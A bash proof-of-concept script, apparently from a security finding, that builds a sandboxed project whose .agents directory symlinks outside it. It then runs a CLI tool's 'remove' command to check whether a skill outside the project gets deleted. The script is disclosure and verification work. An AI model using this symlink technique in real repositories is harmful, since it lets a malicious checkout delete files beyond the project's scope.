#!/usr/bin/env bash
set -uo pipefail

FINDING_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$FINDING_DIR/../../.." && pwd)"
EVIDENCE_DIR="$FINDING_DIR/evidence"
WORKDIR="$EVIDENCE_DIR/workdir"
CLI_LOG="$EVIDENCE_DIR/cli-remove.log"
IMPACT_LOG="$EVIDENCE_DIR/impact.log"
SETUP_LOG="$EVIDENCE_DIR/setup.log"

mkdir -p "$EVIDENCE_DIR"

json() {
  printf '{"status":"%s","evidence":"%s","notes":"%s"}\n' "$1" "$2" "$3"
}

if [ ! -f "$REPO_ROOT/src/cli.ts" ]; then
  echo "Repository root not found from $FINDING_DIR" >&2
  json "failed" "src/cli.ts not found" "run from the promoted finding directory"
  exit 0
fi

if [ ! -d "$REPO_ROOT/node_modules/@clack/prompts" ]; then
  {
    echo "node_modules missing; installing locked dependencies"
    cd "$REPO_ROOT" && pnpm install --frozen-lockfile --ignore-scripts
  } >>"$SETUP_LOG" 2>&1
  if [ $? -ne 0 ]; then
    json "failed" "dependency installation failed" "see evidence/setup.log"
    exit 0
  fi
fi

rm -rf "$WORKDIR"
mkdir -p "$WORKDIR/outside/skills/victim-skill" "$WORKDIR/project" "$WORKDIR/home"
cat >"$WORKDIR/outside/skills/victim-skill/SKILL.md" <<'SKILL'
---
name: victim-skill
description: outside-project guardrail skill that must not be removed by project scope
---

P12_SYMLINK_ESCAPE_SENTINEL
SKILL
printf 'malicious checkout with symlinked agent base\n' >"$WORKDIR/project/README.md"
( cd "$WORKDIR/project" && ln -s ../outside .agents )

BEFORE_MARKER="$(cat "$WORKDIR/outside/skills/victim-skill/SKILL.md" 2>/dev/null | tail -n 1)"

set +e
(
  cd "$WORKDIR/project" && \
  HOME="$WORKDIR/home" \
  XDG_CONFIG_HOME="$WORKDIR/home/.config" \
  DO_NOT_TRACK=1 \
  DISABLE_TELEMETRY=1 \
  node "$REPO_ROOT/src/cli.ts" remove victim-skill -y
) >"$CLI_LOG" 2>&1
CLI_EXIT=$?
set -e

if [ ! -e "$WORKDIR/outside/skills/victim-skill" ]; then
  VICTIM_EXISTS="no"
else
  VICTIM_EXISTS="yes"
fi

{
  echo "PoC: project-scoped skills remove follows a symlinked .agents base"
  echo "repo_root=$REPO_ROOT"
  echo "workdir=$WORKDIR"
  echo "project=$WORKDIR/project"
  echo "project_.agents_symlink=$(readlink "$WORKDIR/project/.agents")"
  echo "outside_skill=$WORKDIR/outside/skills/victim-skill"
  echo "before_marker=$BEFORE_MARKER"
  echo "cli_command=(cd project && node src/cli.ts remove victim-skill -y)"
  echo "cli_exit=$CLI_EXIT"
  echo "outside_victim_exists_after=$VICTIM_EXISTS"
  echo "outside_skills_listing_after:"
  ls -la "$WORKDIR/outside/skills" || true
  echo "--- cli output ---"
  cat "$CLI_LOG" || true
} >"$IMPACT_LOG"

cat "$IMPACT_LOG"

if [ "$VICTIM_EXISTS" = "no" ]; then
  json "confirmed" "outside/skills/victim-skill removed through project .agents symlink" "see evidence/impact.log"
else
  json "failed" "outside/skills/victim-skill still exists" "see evidence/cli-remove.log"
fi
